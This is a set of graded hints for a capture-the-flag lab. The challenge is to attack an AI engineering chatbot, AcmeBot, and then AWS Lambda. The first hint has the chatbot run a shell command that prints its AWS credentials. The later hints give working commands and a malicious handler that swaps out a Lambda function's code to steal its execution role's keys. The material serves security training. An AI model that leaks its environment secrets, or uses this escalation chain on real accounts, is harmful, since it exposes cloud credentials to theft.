# Hints — CTF-002: AcmeBot Engineering Assistant (Advanced)

Try to solve the challenge without hints first.

---

## Hint 1 (Mild)

The chatbot has the same vulnerability as CTF-001. Start there: get AcmeBot to run `printenv | grep AWS`.

The credentials you find won't give you admin access directly. But look carefully at what permissions they _do_ have. What AWS actions are allowed?

---

## Hint 2 (Medium)

The credentials from the chatbot Lambda give you Lambda permissions:
- `lambda:ListFunctions`
- `lambda:UpdateFunctionCode`
- `lambda:InvokeFunction`

List all Lambda functions in the account. Look at the execution roles attached to each one.

```bash
aws lambda list-functions --query 'Functions[*].[FunctionName,Role]' --output table
```

Is there a Lambda function whose execution role looks interesting?

---

## Hint 3 (Strong)

You can replace a Lambda function's code with anything you want using `lambda:UpdateFunctionCode`.

If you replace a function's code with a handler that reads its own `process.env` and returns it in the response, then invoke that function — you'll get the credentials of its execution role.

```javascript
// malicious-lambda.js
exports.handler = async () => ({
  statusCode: 200,
  body: JSON.stringify({
    key: process.env.AWS_ACCESS_KEY_ID,
    secret: process.env.AWS_SECRET_ACCESS_KEY,
    token: process.env.AWS_SESSION_TOKEN
  })
});
```

Package it: `zip malicious.zip malicious-lambda.js`

Update: `aws lambda update-function-code --function-name TARGET --zip-file fileb://malicious.zip`

Invoke: `aws lambda invoke --function-name TARGET /tmp/out.json && cat /tmp/out.json`

Run cleanup when done to restore the original code.
